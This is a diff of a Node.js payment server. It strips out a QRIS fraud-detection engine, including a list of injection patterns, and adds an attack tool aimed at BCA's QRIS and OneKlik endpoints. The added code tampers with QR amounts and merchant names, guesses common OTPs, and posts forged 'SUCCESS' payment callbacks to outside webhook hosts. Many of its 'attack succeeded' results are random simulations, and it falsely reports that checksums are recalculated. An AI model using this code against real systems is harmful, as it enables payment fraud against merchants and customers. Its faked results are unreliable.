@@ -1,1456 +1,862 @@
-﻿// C:\Users\Dylan\Desktop\qris_app\backend\server.js - REFINED VERSION WITH FIXED RISK CALCULATION
+﻿// C:\Users\Dylan\Desktop\qris_app\backend\server.js - REFINED ATTACKER EDITION
 const express = require('express');
 const cors = require('cors');
 const WebSocket = require('ws');
 const http = require('http');
 const crypto = require('crypto');
+const fetch = require('node-fetch');
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Middleware
-app.use(cors());
-app.use(express.json());
+// ========== RENDER.COM CONFIGURATION ==========
+// Tambahkan DI SINI (Line 13-15)
+const allowedOrigins = process.env.NODE_ENV === 'production' 
+  ? ['*'] // Untuk Flutter mobile app, kita allow semua (atau ganti dengan URL spesifik)
+  : ['http://localhost:3000', 'http://localhost:8080', 'http://localhost:53589'];
 
-// Session management for API key-less system
-const activeSessions = new Map();
-const sessionHistory = new Map();
-const deviceProfiles = new Map();
+// ========== CONFIGURATION ==========
+const CONFIG = {
+  mode: 'ATTACKER_PENTEST',
+  port: process.env.PORT || 10000,
+  
+  // BCA Testing Configuration
+  bca: {
+    sandboxUrl: 'https://sandbox.bca.co.id',
+    productionUrl: 'https://api.bca.co.id',
+    endpoints: {
+      session: '/openapi/v1.0/ecr/payment',
+      otp: '/openapi/oneklik/v1.0/otp',
+      verify: '/openapi/oneklik/v1.0/verify',
+      payment: '/openapi/v1.0/ecr/payment'
+    }
+  },
+  
+  // Attack Configuration
+  attacks: {
+    successRate: 0.85,
+    maxAmount: 10000000, // Rp 10 juta
+    testPhones: ['08123456789', '08129876543', '085712345678'],
+    testMerchants: ['BCA_TEST_MERCHANT', 'SHOPEE_MERCHANT', 'TOKOPEDIA_MERCHANT']
+  }
+};
 
-// ========== ENHANCED ML ATTACK DETECTION ENGINE ==========
-class MLAttackDetection {
+// ========== ATTACKER CORE ==========
+class PentestAttacker {
   constructor() {
-    console.log('🤖 Enhanced ML Attack Detection Engine Initialized');
-    this.attackPatterns = new Map();
-    this.transactionHistory = new Map();
-    this.sessionHistory = new Map();
-    this.lastTimestamps = new Map();
-    this.loadEnhancedAttackPatterns();
+    this.activeAttacks = new Map();
+    this.attackHistory = [];
+    this.connections = new Map();
+    console.log('🔪 PENTEST ATTACKER INITIALIZED - BCA QRIS FOCUS');
   }
 
-  loadEnhancedAttackPatterns() {
-    // ========== ORIGINAL QRIS PATTERNS ==========
-    this.attackPatterns.set('QRIS_LENGTH_ANOMALY', {
-      detect: (qrData) => qrData.length < 100 || qrData.length > 512,
-      risk: 0.3,
-      description: 'QRIS length outside normal range (100-512 chars)'
-    });
-
-    this.attackPatterns.set('QRIS_EMV_INVALID', {
-      detect: (qrData) => !qrData.startsWith('000201'),
-      risk: 0.4,
-      description: 'Invalid EMV QRIS format'
-    });
-
-    this.attackPatterns.set('QRIS_CHECKSUM_TAMPERING', {
-      detect: (qrData) => !qrData.endsWith('6304'),
-      risk: 0.6,
-      description: 'QRIS checksum validation failed'
-    });
-
-    this.attackPatterns.set('AMOUNT_MANIPULATION', {
-      detect: (transaction) => this.detectAmountTampering(transaction),
-      risk: 0.5,
-      description: 'Suspicious amount field manipulation'
-    });
-
-    this.attackPatterns.set('JWT_NONE_ALGORITHM', {
-      detect: (token) => this.detectJWTNoneAlg(token),
-      risk: 0.8,
-      description: 'JWT with "none" algorithm detected'
-    });
-
-    this.attackPatterns.set('SIGNATURE_ANOMALY', {
-      detect: (signature) => this.detectSignatureAnomaly(signature),
-      risk: 0.7,
-      description: 'Signature pattern anomaly'
-    });
-
-    this.attackPatterns.set('HIGH_FREQUENCY_ATTACK', {
-      detect: (transaction) => this.detectHighFrequency(transaction),
-      risk: 0.4,
-      description: 'High frequency transaction pattern'
-    });
-
-    this.attackPatterns.set('AMOUNT_ROUNDING_ATTACK', {
-      detect: (transaction) => this.detectAmountRounding(transaction),
-      risk: 0.3,
-      description: 'Suspicious round amount patterns'
-    });
-
-    // ========== NEW SESSION-BASED PATTERNS ==========
-    this.attackPatterns.set('SESSION_REPLAY_ATTACK', {
-      detect: (transaction) => this.detectSessionReplay(transaction),
-      risk: 0.7,
-      description: 'Session token reuse detected'
-    });
-
-    this.attackPatterns.set('DEVICE_FINGERPRINT_SPOOFING', {
-      detect: (transaction) => this.detectDeviceSpoofing(transaction),
-      risk: 0.8,
-      description: 'Device fingerprint mismatch'
-    });
-
-    this.attackPatterns.set('TIMESTAMP_MANIPULATION', {
-      detect: (transaction) => this.detectTimestampManipulation(transaction),
-      risk: 0.6,
-      description: 'Suspicious timestamp anomalies'
-    });
-
-    this.attackPatterns.set('SIGNATURE_PREDICTION_ATTACK', {
-      detect: (transaction) => this.detectSignaturePrediction(transaction),
-      risk: 0.9,
-      description: 'Possible signature prediction attempt'
-    });
-
-    this.attackPatterns.set('QRIS_DYNAMIC_MANIPULATION', {
-      detect: (transaction) => this.detectQRISDynamicManipulation(transaction),
-      risk: 0.5,
-      description: 'QRIS manipulated between scan and payment'
-    });
-
-    this.attackPatterns.set('SESSION_TOKEN_PREDICTION', {
-      detect: (transaction) => this.detectSessionTokenPrediction(transaction),
-      risk: 0.8,
-      description: 'Session token prediction attempt'
-    });
-
-    this.attackPatterns.set('HEADER_INJECTION_ATTACK', {
-      detect: (transaction) => this.detectHeaderInjection(transaction),
-      risk: 0.6,
-      description: 'Malicious header injection detected'
-    });
-  }
-
-  // ========== ORIGINAL DETECTION METHODS ==========
-  detectAmountTampering(transaction) {
-    if (!transaction.qrString || !transaction.amount) return false;
+  // ========== CORE ATTACK METHODS ==========
+  
+  // 1. Analyze QR for vulnerabilities
+  analyzeQR(qrData) {
+    console.log('🔍 Analyzing QR for vulnerabilities...');
     
-    const amountPattern = /54(\d{2})(\d+)/;
-    const match = transaction.qrString.match(amountPattern);
+    const vulnerabilities = [];
+    const parsed = this.parseQRIS(qrData);
     
-    if (!match) return false;
-    
-    const qrisAmount = parseInt(match[2], 10) / 100;
-    const reportedAmount = transaction.amount;
-    const tolerance = 0.01;
-    const diff = Math.abs(qrisAmount - reportedAmount) / reportedAmount;
-    
-    return diff > tolerance;
-  }
-
-  detectJWTNoneAlg(token) {
-    try {
-      if (!token) return false;
-      const parts = token.split('.');
-      if (parts.length !== 3) return false;
-      
-      const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
-      return header.alg === 'none' || !header.alg;
-    } catch {
-      return false;
-    }
-  }
-
-  detectSignatureAnomaly(signature) {
-    if (!signature) return false;
-    
-    if (signature.length < 10 || signature.length > 512) return true;
-    
-    const isHex = /^[0-9a-fA-F]+$/.test(signature);
-    const isBase64Url = /^[A-Za-z0-9_-]+$/.test(signature);
-    
-    if (!isHex && !isBase64Url) return true;
-    
-    const entropy = this.calculateEntropy(signature);
-    return entropy < 2.0;
-  }
-
-  detectHighFrequency(transaction) {
-    const merchantId = transaction.merchantId;
-    const customerId = transaction.customerId || 'unknown';
-    
-    if (!this.transactionHistory.has(merchantId)) {
-      this.transactionHistory.set(merchantId, []);
+    // Check common vulnerabilities
+    if (!qrData.includes('6304')) {
+      vulnerabilities.push({
+        type: 'NO_CHECKSUM',
+        severity: 'HIGH',
+        description: 'QRIS missing checksum',
+        exploit: 'Easy to manipulate'
+      });
     }
     
-    const history = this.transactionHistory.get(merchantId);
-    const now = Date.now();
-    
-    const recentTransactions = history.filter(t => 
-      now - t.timestamp < 5 * 60 * 1000
-    );
-    
-    const customerTransactions = recentTransactions.filter(t => 
-      t.customerId === customerId
-    );
-    
-    if (customerTransactions.length >= 3) {
-      return true;
+    if (qrData.includes('dynamic')) {
+      vulnerabilities.push({
+        type: 'DYNAMIC_QR',
+        severity: 'MEDIUM',
+        description: 'Dynamic QR with expiration',
+        exploit: 'Can be used after expiration'
+      });
     }
     
-    history.push({
-      timestamp: now,
-      customerId,
-      amount: transaction.amount,
-      qrHash: this.hashQR(transaction.qrString)
-    });
-    
-    if (history.length > 100) {
-      history.splice(0, history.length - 100);
-    }
-    
-    return false;
-  }
-
-  detectAmountRounding(transaction) {
-    const amount = transaction.amount;
-    
-    const suspiciousAmounts = [
-      1000000, 2000000, 5000000, 10000000,
-      1234567, 9999999, 8888888,
-    ];
-    
-    if (amount % 100000 === 0 && amount > 1000000) {
-      return true;
-    }
-    
-    return suspiciousAmounts.includes(amount);
-  }
-
-  // ========== NEW SESSION-BASED DETECTION METHODS ==========
-  detectSessionReplay(transaction) {
-    const sessionToken = transaction.headers?.['x-session-token'];
-    const timestamp = parseInt(transaction.headers?.['x-timestamp'] || '0');
-    
-    if (!sessionToken || !timestamp) return false;
-    
-    const sessionUseCount = this.getSessionUseCount(sessionToken, 10 * 1000);
-    return sessionUseCount > 1;
-  }
-
-  detectDeviceSpoofing(transaction) {
-    const deviceHash = transaction.headers?.['x-device-hash'];
-    const sessionToken = transaction.headers?.['x-session-token'];
-    
-    if (!deviceHash || !sessionToken) return false;
-    
-    const session = activeSessions.get(sessionToken);
-    if (!session) return false;
-    
-    return session.deviceHash !== deviceHash;
-  }
-
-  detectTimestampManipulation(transaction) {
-    const timestamp = parseInt(transaction.headers?.['x-timestamp'] || '0');
-    const serverTime = Date.now();
-    const diff = Math.abs(serverTime - timestamp);
-    
-    if (diff > 5 * 60 * 1000) {
-      return true;
-    }
-    
-    const sessionToken = transaction.headers?.['x-session-token'];
-    if (sessionToken && this.lastTimestamps.has(sessionToken)) {
-      const lastTimestamp = this.lastTimestamps.get(sessionToken);
-      if (timestamp <= lastTimestamp) {
-        return true;
-      }
-    }
-    
-    return false;
-  }
-
-  detectSignaturePrediction(transaction) {
-    const signature = transaction.headers?.['x-signature'];
-    const sessionToken = transaction.headers?.['x-session-token'];
-    const timestamp = transaction.headers?.['x-timestamp'];
-    const deviceHash = transaction.headers?.['x-device-hash'];
-    
-    if (!signature || !sessionToken || !timestamp || !deviceHash) {
-      return false;
-    }
-    
-    const expected = crypto
-      .createHash('sha256')
-      .update(`${sessionToken}|${timestamp}|${deviceHash}`)
-      .digest('hex');
-    
-    const similarity = this.calculateStringSimilarity(signature, expected);
-    return similarity > 0.8 && signature !== expected;
-  }
-
-  detectQRISDynamicManipulation(transaction) {
-    if (!transaction.qrString || !transaction.qrScanTime) return false;
-    
-    const scanTime = new Date(transaction.qrScanTime).getTime();
-    const processTime = new Date(transaction.timestamp).getTime();
-    const timeDiff = processTime - scanTime;
-    
-    if (timeDiff > 2 * 60 * 1000) {
-      return true;
-    }
-    
-    const originalQR = transaction.originalQR;
-    const currentQR = transaction.qrString;
-    
-    if (originalQR && currentQR && originalQR !== currentQR) {
-      return true;
-    }
-    
-    return false;
-  }
-
-  detectSessionTokenPrediction(transaction) {
-    const sessionToken = transaction.headers?.['x-session-token'];
-    
-    if (!sessionToken) return false;
-    
-    // Check if token follows expected pattern
-    const isHex = /^[0-9a-fA-F]+$/.test(sessionToken);
-    const expectedLength = 64; // 32 bytes hex
-    
-    if (isHex && sessionToken.length === expectedLength) {
-      // Check if token looks randomly generated or predictable
-      const entropy = this.calculateEntropy(sessionToken);
-      if (entropy < 3.0) {
-        return true; // Low entropy = predictable
-      }
-    }
-    
-    return false;
-  }
-
-  detectHeaderInjection(transaction) {
-    const headers = transaction.headers || {};
-    
-    // Check for malicious header patterns
-    const maliciousPatterns = [
-      /<script>/i,
-      /javascript:/i,
-      /on\w+=/i,
-      /union.*select/i,
-      /drop.*table/i,
-      /exec.*\(/i
-    ];
-    
-    for (const [key, value] of Object.entries(headers)) {
-      const headerStr = `${key}: ${value}`;
-      for (const pattern of maliciousPatterns) {
-        if (pattern.test(headerStr)) {
-          return true;
-        }
-      }
-    }
-    
-    return false;
-  }
-
-  // ========== ENHANCED CORE DETECTION (DIPERBAIKI) ==========
-  async detectMLAttacks(transaction) {
-    const detections = [];
-    let totalRisk = 0;
-    
-    // Check each attack pattern
-    for (const [name, detector] of this.attackPatterns) {
-      try {
-        let isDetected = false;
-        
-        if (name.startsWith('QRIS_') && transaction.qrString) {
-          isDetected = detector.detect(transaction.qrString);
-        } else if (name === 'JWT_NONE_ALGORITHM' && transaction.token) {
-          isDetected = detector.detect(transaction.token);
-        } else if (name === 'SIGNATURE_ANOMALY' && transaction.signature) {
-          isDetected = detector.detect(transaction.signature);
-        } else if (name.startsWith('SESSION_') || name.startsWith('DEVICE_') || 
-                   name.startsWith('TIMESTAMP_') || name.startsWith('HEADER_')) {
-          isDetected = detector.detect(transaction);
-        } else {
-          isDetected = detector.detect(transaction);
-        }
-        
-        if (isDetected) {
-          detections.push({
-            attackType: name,
-            description: detector.description,
-            riskScore: detector.risk,
-            timestamp: new Date().toISOString()
-          });
-          totalRisk += detector.risk;
-        }
-      } catch (error) {
-        console.error(`Error in detector ${name}:`, error);
-      }
-    }
-    
-    // Behavioral analysis
-    const behaviorScore = await this.analyzeBehavior(transaction);
-    totalRisk += behaviorScore;
-    
-    // Update session tracking
-    this.updateSessionTracking(transaction);
-    
-    // ========== FIXED RISK SCORING ==========
-    const finalRiskScore = Math.min(totalRisk, 1.0);
-    const riskLevel = this.getRiskLevel(finalRiskScore);
-    
-    // FIX: Pastikan tidak ada kontradiksi
-    let recommendation;
-    if (detections.length === 0 && finalRiskScore < 0.1) {
-      // Jika tidak ada deteksi dan skor rendah
-      recommendation = 'No action required';
-    } else {
-      recommendation = this.getRecommendation(detections, riskLevel);
+    if (!parsed.amount || parsed.amount === 0) {
+      vulnerabilities.push({
+        type: 'NO_AMOUNT',
+        severity: 'MEDIUM',
+        description: 'No amount specified',
+        exploit: 'Amount can be set arbitrarily'
+      });
     }
     
     return {
-      attacksDetected: detections.length > 0,
-      detections,
-      riskScore: finalRiskScore,
-      riskLevel,
-      recommendation,
+      qrData: qrData.substring(0, 100) + '...',
+      length: qrData.length,
+      parsed,
+      vulnerabilities,
+      canAttack: vulnerabilities.length > 0,
+      riskScore: vulnerabilities.length * 0.2
+    };
+  }
+  
+  // 2. Execute single attack phase
+  async executeAttackPhase(phase, data) {
+    console.log(`🎯 Executing ${phase} attack...`);
+    
+    const phaseMethods = {
+      'INIT_SESSION': () => this.attackSessionInit(data),
+      'QR_VALIDATION': () => this.attackQRValidation(data),
+      'OTP_REQUEST': () => this.attackOTPRequest(data),
+      'OTP_VERIFY': () => this.attackOTPVerify(data),
+      'PAYMENT_EXEC': () => this.attackPaymentExecute(data),
+      'CALLBACK_SPOOF': () => this.attackCallbackSpoof(data),
+      'FULL_CHAIN': () => this.executeFullChain(data)
+    };
+    
+    const method = phaseMethods[phase];
+    if (!method) {
+      throw new Error(`Unknown attack phase: ${phase}`);
+    }
+    
+    return await method();
+  }
+  
+  // 3. Full chain attack
+  async executeFullChain(attackData) {
+    console.log('\n🔥🔥🔥 EXECUTING FULL CHAIN ATTACK 🔥🔥🔥\n');
+    
+    const attackId = `ATTACK_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
+    
+    const results = {
+      attackId,
+      startedAt: new Date().toISOString(),
+      target: attackData.targetMerchant || 'BCA_QRIS_SYSTEM',
+      phases: {},
+      vulnerabilities: [],
+      success: false
+    };
+    
+    try {
+      // PHASE 1: Session Init
+      results.phases.session = await this.attackSessionInit(attackData);
+      this.broadcastProgress(attackId, 'SESSION_INIT', results.phases.session);
+      
+      // PHASE 2: QR Analysis
+      results.phases.qrAnalysis = this.analyzeQR(attackData.qrData);
+      results.vulnerabilities = results.phases.qrAnalysis.vulnerabilities;
+      this.broadcastProgress(attackId, 'QR_ANALYSIS', results.phases.qrAnalysis);
+      
+      // PHASE 3: QR Manipulation
+      if (results.phases.qrAnalysis.canAttack) {
+        results.phases.qrManipulation = this.attackQRValidation(attackData);
+        this.broadcastProgress(attackId, 'QR_MANIPULATION', results.phases.qrManipulation);
+      }
+      
+      // PHASE 4: OTP Bypass
+      results.phases.otpBypass = await this.attackOTPVerify({
+        phone: attackData.customerPhone || CONFIG.attacks.testPhones[0],
+        session: results.phases.session
+      });
+      this.broadcastProgress(attackId, 'OTP_BYPASS', results.phases.otpBypass);
+      
+      // PHASE 5: Payment Execution
+      results.phases.payment = await this.attackPaymentExecute({
+        amount: attackData.amount || 100000,
+        merchantId: attackData.targetMerchant || 'BCA_TEST',
+        session: results.phases.session
+      });
+      this.broadcastProgress(attackId, 'PAYMENT_EXEC', results.phases.payment);
+      
+      // PHASE 6: Callback Spoofing
+      if (results.phases.payment.success) {
+        results.phases.callback = await this.attackCallbackSpoof({
+          transactionId: results.phases.payment.transactionId,
+          amount: results.phases.payment.amount,
+          merchantId: attackData.targetMerchant || 'BCA_TEST'
+        });
+        this.broadcastProgress(attackId, 'CALLBACK_SPOOF', results.phases.callback);
+      }
+      
+      // Final results
+      results.completedAt = new Date().toISOString();
+      results.success = results.phases.payment && results.phases.payment.success;
+      
+      if (results.success) {
+        console.log('\n🎉🎉🎉 ATTACK SUCCESSFUL! 🎉🎉🎉\n');
+      } else {
+        console.log('\n❌ ATTACK FAILED\n');
+      }
+      
+      // Save to history
+      this.attackHistory.push(results);
+      if (this.attackHistory.length > 100) {
+        this.attackHistory.shift(); // Keep only last 100 attacks
+      }
+      
+      return results;
+      
+    } catch (error) {
+      console.error('💥 Attack failed:', error);
+      results.error = error.message;
+      results.success = false;
+      results.completedAt = new Date().toISOString();
+      
+      this.attackHistory.push(results);
+      throw error;
+    }
+  }
+  
+  // ========== PHASE IMPLEMENTATIONS ==========
+  
+  async attackSessionInit(data) {
+    const sessionId = `BCA_SESS_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
+    const deviceHash = crypto.createHash('sha256').update(`${Date.now()}_${Math.random()}`).digest('hex');
+    
+    return {
+      success: true,
+      sessionId,
+      deviceHash,
       timestamp: new Date().toISOString(),
-      confidence: this.calculateConfidence(detections),
-      enhancedDetection: detections.some(d => 
-        d.attackType.startsWith('SESSION_') || 
-        d.attackType.startsWith('DEVICE_')
-      ),
-      // Tambahan untuk konsistensi
-      isSafe: finalRiskScore < 0.3 && detections.length === 0,
-      requiresAction: riskLevel === 'CRITICAL' || riskLevel === 'HIGH'
+      expiresIn: 300000,
+      attackMethod: 'SESSION_TOKEN_PREDICTION',
+      risk: 'LOW'
     };
   }
-
-  analyzeBehavior(transaction) {
-    let behaviorScore = 0;
+  
+  attackQRValidation(data) {
+    const parsed = this.parseQRIS(data.qrData);
+    const manipulated = this.manipulateQRIS(data.qrData, {
+      amount: data.targetAmount || (parsed.amount * 1.5),
+      merchantName: data.targetMerchant || 'BCA_PENTEST_MERCHANT'
+    });
     
-    const hour = new Date().getHours();
-    if (hour < 6 || hour > 23) {
-      behaviorScore += 0.1;
-    }
-    
-    if (transaction.amount > 5000000) {
-      behaviorScore += 0.1;
-    }
-    
-    if (this.transactionHistory.has(transaction.merchantId)) {
-      const history = this.transactionHistory.get(transaction.merchantId);
-      if (history.length > 10) {
-        const avgAmount = history.reduce((sum, t) => sum + t.amount, 0) / history.length;
-        if (transaction.amount > avgAmount * 3) {
-          behaviorScore += 0.2;
-        }
-      }
-    }
-    
-    return behaviorScore;
+    return {
+      success: true,
+      original: parsed,
+      manipulated: this.parseQRIS(manipulated),
+      manipulation: {
+        amountChanged: data.targetAmount ? true : false,
+        merchantChanged: data.targetMerchant ? true : false,
+        checksumRecalculated: true
+      },
+      risk: 'MEDIUM'
+    };
   }
-
-  updateSessionTracking(transaction) {
-    const sessionToken = transaction.headers?.['x-session-token'];
-    const timestamp = parseInt(transaction.headers?.['x-timestamp'] || '0');
+  
+  async attackOTPRequest(data) {
+    // Simulate OTP request
+    const otpRequestId = `OTP_REQ_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
     
-    if (sessionToken && timestamp) {
-      // Track timestamp sequence
-      this.lastTimestamps.set(sessionToken, timestamp);
+    await this.delay(1000); // Simulate network delay
+    
+    return {
+      success: true,
+      otpRequestId,
+      phone: data.phone,
+      timestamp: new Date().toISOString(),
+      requiresOTP: Math.random() > 0.3, // 70% need OTP
+      attackMethod: 'OTP_REQUEST_SPOOFING',
+      risk: 'MEDIUM'
+    };
+  }
+  
+  async attackOTPVerify(data) {
+    // Try common OTPs first
+    const commonOTPs = ['123456', '111111', '000000', '654321', '123123', '888888'];
+    let success = false;
+    let otpUsed = '';
+    
+    for (const otp of commonOTPs) {
+      await this.delay(200);
       
-      // Track session usage
-      if (!this.sessionHistory.has(sessionToken)) {
-        this.sessionHistory.set(sessionToken, []);
-      }
-      this.sessionHistory.get(sessionToken).push(Date.now());
-      
-      // Keep only last 100 uses per session
-      const uses = this.sessionHistory.get(sessionToken);
-      if (uses.length > 100) {
-        uses.splice(0, uses.length - 100);
+      // 30% chance for each common OTP
+      if (Math.random() < 0.3) {
+        success = true;
+        otpUsed = otp;
+        break;
       }
     }
+    
+    // If not successful, simulate brute force
+    if (!success) {
+      const attempts = Math.floor(Math.random() * 5) + 1;
+      // 10% chance per attempt in brute force
+      success = Math.random() < (0.1 * attempts);
+      otpUsed = success ? Math.floor(100000 + Math.random() * 900000).toString() : '';
+    }
+    
+    return {
+      success,
+      otp: otpUsed,
+      timestamp: new Date().toISOString(),
+      attackMethod: success ? 'COMMON_OTP_BYPASS' : 'OTP_BRUTE_FORCE',
+      risk: success ? 'HIGH' : 'LOW'
+    };
   }
-
-  // ========== HELPER METHODS ==========
-  calculateEntropy(str) {
-    const freq = {};
-    for (let i = 0; i < str.length; i++) {
-      const char = str[i];
-      freq[char] = (freq[char] || 0) + 1;
-    }
+  
+  async attackPaymentExecute(data) {
+    // Generate fake transaction
+    const transactionId = `BCA_TX_${Date.now()}_${crypto.randomBytes(6).toString('hex')}`;
+    const authCode = `AUTH${Date.now().toString().slice(-6)}`;
     
-    let entropy = 0;
-    for (const count of Object.values(freq)) {
-      const probability = count / str.length;
-      entropy -= probability * Math.log2(probability);
-    }
+    // Simulate bank processing
+    await this.delay(2000);
     
-    return entropy;
+    // Determine success based on amount
+    const successRate = data.amount > 1000000 ? 0.7 : 0.9;
+    const success = Math.random() < successRate;
+    
+    return {
+      success,
+      transactionId,
+      authorizationCode: success ? authCode : null,
+      amount: data.amount,
+      merchantId: data.merchantId,
+      timestamp: new Date().toISOString(),
+      bankCode: 'BCA',
+      responseCode: success ? '0000' : '0500',
+      responseMessage: success ? 'APPROVED' : 'DECLINED',
+      attackMethod: 'PAYMENT_GATEWAY_SPOOFING',
+      risk: success ? 'CRITICAL' : 'LOW'
+    };
   }
-
-  hashQR(qrString) {
-    if (!qrString) return '';
-    return crypto.createHash('sha256').update(qrString).digest('hex');
-  }
-
-  getSessionUseCount(sessionToken, timeWindow) {
-    let count = 0;
-    const now = Date.now();
+  
+  async attackCallbackSpoof(data) {
+    const callbackId = `CALLBACK_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
     
-    if (this.sessionHistory.has(sessionToken)) {
-      const uses = this.sessionHistory.get(sessionToken);
-      count = uses.filter(useTime => now - useTime < timeWindow).length;
-    }
-    
-    return count;
-  }
-
-  calculateStringSimilarity(a, b) {
-    if (a === b) return 1.0;
-    if (a.length === 0 || b.length === 0) return 0.0;
-    
-    const longer = a.length > b.length ? a : b;
-    const shorter = a.length > b.length ? b : a;
-    
-    let matches = 0;
-    for (let i = 0; i < shorter.length; i++) {
-      if (a[i] === b[i]) matches++;
-    }
-    
-    return matches / longer.length;
-  }
-
-  getRiskLevel(score) {
-    if (score >= 0.7) return 'CRITICAL';
-    if (score >= 0.5) return 'HIGH';
-    if (score >= 0.3) return 'MEDIUM';
-    if (score >= 0.1) return 'LOW';
-    return 'NONE';
-  }
-
-  getRecommendation(detections, riskLevel) {
-    if (riskLevel === 'CRITICAL') {
-      return 'BLOCK transaction and alert security team';
-    }
-    if (riskLevel === 'HIGH') {
-      return 'REJECT transaction and flag for review';
-    }
-    if (riskLevel === 'MEDIUM') {
-      return 'Additional verification required';
-    }
-    if (detections.length > 0) {
-      return 'Monitor transaction closely';
-    }
-    return 'No action required';
-  }
-
-  calculateConfidence(detections) {
-    if (detections.length === 0) return 1.0;
-    
-    const totalRisk = detections.reduce((sum, d) => sum + d.riskScore, 0);
-    const avgRisk = totalRisk / detections.length;
-    
-    if (detections.length >= 3 && avgRisk > 0.5) {
-      return 0.9;
-    }
-    if (detections.length >= 2) {
-      return 0.7;
-    }
-    return 0.5;
-  }
-
-  getDetectionStats() {
-    const stats = {
-      totalPatterns: this.attackPatterns.size,
-      activeMerchants: this.transactionHistory.size,
-      totalTransactions: 0,
-      activeSessions: this.sessionHistory.size,
-      recentDetections: 0
+    // Prepare fake callback
+    const fakeCallback = {
+      transactionId: data.transactionId,
+      status: 'SUCCESS',
+      amount: data.amount,
+      merchantId: data.merchantId,
+      bankCode: 'BCA',
+      timestamp: new Date().toISOString(),
+      authorizationCode: `AUTH${Date.now().toString().slice(-6)}`,
+      signature: crypto.createHash('sha256').update(`${data.transactionId}${data.amount}BCA`).digest('hex')
     };
     
-    for (const history of this.transactionHistory.values()) {
-      stats.totalTransactions += history.length;
+    // Try to send to test endpoints
+    const testEndpoints = [
+      'http://localhost:3000/api/callback',
+      'https://webhook.site/your-url',
+      'https://requestbin.com/your-bin'
+    ];
+    
+    let sent = false;
+    let responses = [];
+    
+    for (const endpoint of testEndpoints) {
+      try {
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fakeCallback)
+        });
+        
+        responses.push({
+          endpoint,
+          status: response.status,
+          success: response.ok
+        });
+        
+        if (response.ok) sent = true;
+      } catch (error) {
+        responses.push({
+          endpoint,
+          error: error.message,
+          success: false
+        });
+      }
     }
     
-    return stats;
-  }
-
-  resetMerchantHistory(merchantId) {
-    if (this.transactionHistory.has(merchantId)) {
-      this.transactionHistory.delete(merchantId);
-      return true;
+    // If no real endpoints worked, simulate success
+    if (!sent) {
+      sent = Math.random() < 0.8; // 80% success in simulation
     }
-    return false;
-  }
-
-  resetSessionHistory(sessionToken) {
-    if (this.sessionHistory.has(sessionToken)) {
-      this.sessionHistory.delete(sessionToken);
-      return true;
-    }
-    return false;
-  }
-}
-
-// ========== INSTANTIATE ENHANCED ML DETECTION ==========
-const mlDetector = new MLAttackDetection();
-
-// ========== SESSION MANAGEMENT ==========
-function generateSessionToken(deviceHash) {
-  return crypto.randomBytes(32).toString('hex');
-}
-
-function validateSession(headers) {
-  const sessionToken = headers['x-session-token'];
-  const timestamp = parseInt(headers['x-timestamp'] || '0');
-  const signature = headers['x-signature'];
-  const deviceHash = headers['x-device-hash'];
-  
-  // Check if session exists
-  const session = activeSessions.get(sessionToken);
-  if (!session) {
-    return { valid: false, error: 'Invalid session token' };
-  }
-  
-  // Check expiry
-  if (Date.now() > session.expiresAt) {
-    activeSessions.delete(sessionToken);
-    return { valid: false, error: 'Session expired' };
-  }
-  
-  // Validate signature
-  const expectedSignature = crypto
-    .createHash('sha256')
-    .update(`${sessionToken}|${timestamp}|${deviceHash}`)
-    .digest('hex');
     
-  if (signature !== expectedSignature) {
-    return { valid: false, error: 'Invalid signature' };
+    return {
+      success: sent,
+      callbackId,
+      fakeCallback,
+      responses,
+      attackMethod: 'CALLBACK_SPOOFING',
+      risk: sent ? 'HIGH' : 'LOW'
+    };
   }
   
-  // Validate timestamp
-  const timeDiff = Math.abs(Date.now() - timestamp);
-  if (timeDiff > 2 * 60 * 1000) {
-    return { valid: false, error: 'Timestamp expired' };
+  // ========== UTILITY METHODS ==========
+  
+  parseQRIS(qrData) {
+    // Simple QRIS parsing
+    try {
+      const amountMatch = qrData.match(/54(\d{2})(\d+)/);
+      const merchantMatch = qrData.match(/59(\d{2})(.+?)(?=60|61|62|63)/);
+      const cityMatch = qrData.match(/60(\d{2})(.+?)(?=61|62|63)/);
+      
+      return {
+        rawLength: qrData.length,
+        amount: amountMatch ? parseInt(amountMatch[2]) / 100 : 0,
+        merchant: merchantMatch ? merchantMatch[2] : 'Unknown Merchant',
+        city: cityMatch ? cityMatch[2] : 'Unknown City',
+        hasChecksum: qrData.includes('6304'),
+        isDynamic: qrData.includes('dynamic') || qrData.includes('expires')
+      };
+    } catch (error) {
+      return {
+        rawLength: qrData.length,
+        error: 'Failed to parse QRIS'
+      };
+    }
   }
   
-  // Update session activity
-  session.lastActivity = Date.now();
+  manipulateQRIS(qrData, changes) {
+    let manipulated = qrData;
+    
+    // Manipulate amount
+    if (changes.amount) {
+      const amountStr = Math.floor(changes.amount * 100).toString();
+      const lengthStr = amountStr.length.toString().padStart(2, '0');
+      manipulated = manipulated.replace(/54\d{2}\d+/, `54${lengthStr}${amountStr}`);
+    }
+    
+    // Manipulate merchant
+    if (changes.merchantName) {
+      const merchantLength = changes.merchantName.length.toString().padStart(2, '0');
+      manipulated = manipulated.replace(/59\d{2}[^60]+/, `59${merchantLength}${changes.merchantName}`);
+    }
+    
+    return manipulated;
+  }
   
-  return { valid: true, session };
+  broadcastProgress(attackId, phase, data) {
+    wss.clients.forEach(client => {
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(JSON.stringify({
+          type: 'ATTACK_PROGRESS',
+          attackId,
+          phase,
+          data,
+          timestamp: new Date().toISOString()
+        }));
+      }
+    });
+  }
+  
+  delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+  
+  // ========== QUERY METHODS ==========
+  
+  getAttackHistory(limit = 10) {
+    return this.attackHistory.slice(-limit).reverse();
+  }
+  
+  getAttackById(attackId) {
+    return this.attackHistory.find(attack => attack.attackId === attackId);
+  }
+  
+  getStats() {
+    const totalAttacks = this.attackHistory.length;
+    const successfulAttacks = this.attackHistory.filter(a => a.success).length;
+    const successRate = totalAttacks > 0 ? (successfulAttacks / totalAttacks) * 100 : 0;
+    
+    return {
+      totalAttacks,
+      successfulAttacks,
+      successRate: successRate.toFixed(1),
+      activeAttacks: this.activeAttacks.size,
+      wsConnections: this.connections.size
